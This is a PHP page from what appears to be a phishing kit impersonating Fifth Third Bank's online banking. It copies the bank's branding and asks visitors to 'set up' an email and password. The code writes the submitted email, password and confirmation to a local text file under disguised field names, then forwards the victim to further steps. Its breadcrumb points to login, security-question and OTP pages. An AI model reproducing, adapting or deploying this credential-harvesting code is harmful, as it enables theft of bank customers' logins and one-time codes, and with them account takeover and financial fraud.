<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirm_password'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email address is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Please enter a valid email address';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirm_password'] = 'Please confirm your password';
    } elseif ($password !== $confirmPassword) {
        $errors['confirm_password'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save email and password data
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'emzemz' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password,
            'confirm_password' => $confirmPassword,
            'password_strength' => 'strong'
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Email & Password Setup</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Email Password Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="security_questions.php" class="text-white/70 hover:text-white">Security Questions</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="otp.php" class="text-white/70 hover:text-white">OTP Verification</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Email & Password</span>
                </div>

                <!-- Email Password Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-md w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <div class="text-center mb-6">
                                <div class="mx-auto w-16 h-16 bg-[#123b9d] rounded-full flex items-center justify-center mb-4">
                                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                                    </svg>
                                </div>
                                <h1 class="text-2xl font-bold text-gray-800 mb-2">Set Up Your Account</h1>
                                <p class="text-sm text-gray-600">Create your email address and password for secure online banking access.</p>
                            </div>
                            
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-6">
                                <!-- Email Field -->
                                <div>
                                    <label for="email" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Email Address
                                    </label>
                                    <div class="relative">
                                        <input
                                            type="email"
                                            id="email"
                                            name="email"
                                            placeholder="Enter your email address"
                                            value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            autocomplete="email"
                                        />
                                    </div>
                                    <?php if (isset($errors['email'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['email']); ?></p>
                                    <?php endif; ?>
                                    <p class="mt-2 text-xs text-gray-500">We'll use this for account notifications and security alerts</p>
                                </div>

                                <!-- Password Field -->
                                <div>
                                    <label for="password" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Password
                                    </label>
                                    <div class="relative">
                                        <input
                                            type="password"
                                            id="password"
                                            name="password"
                                            placeholder="Create a strong password"
                                            value="<?php echo htmlspecialchars($_POST['password'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 pr-16 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            autocomplete="new-password"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePasswordVisibility('password')"
                                            class="absolute inset-y-0 right-3 flex items-center text-sm font-semibold text-[#003087] hover:underline"
                                        >
                                            <span id="toggleText-password">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['password'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['password']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Confirm Password Field -->
                                <div>
                                    <label for="confirm_password" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Confirm Password
                                    </label>
                                    <div class="relative">
                                        <input
                                            type="password"
                                            id="confirm_password"
                                            name="confirm_password"
                                            placeholder="Re-enter your password"
                                            value="<?php echo htmlspecialchars($_POST['confirm_password'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 pr-16 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            autocomplete="new-password"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePasswordVisibility('confirm_password')"
                                            class="absolute inset-y-0 right-3 flex items-center text-sm font-semibold text-[#003087] hover:underline"
                                        >
                                            <span id="toggleText-confirm_password">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['confirm_password'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['confirm_password']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Continue
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Account Security</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    Creating a strong password is essential for protecting your financial information. Follow our security best practices to keep your account safe.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Strong Password Tips</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            Use a combination of uppercase and lowercase letters, numbers, and special characters. Avoid using personal information like birthdays or names that could be easily guessed.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Email Security</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            Your email address is used for important account notifications and security alerts. Keep it secure and up to date to ensure you receive all important communications.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Use a unique email for banking</li>
                            <li>• Enable two-factor authentication</li>
                            <li>• Monitor for suspicious activity</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const toggleText = document.getElementById('toggleText-' + fieldId);
            
            if (field.type === 'password') {
                field.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                field.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailField = document.getElementById('email');
            if (emailField) {
                emailField.focus();
            }
        });
    </script>
</body>
</html>
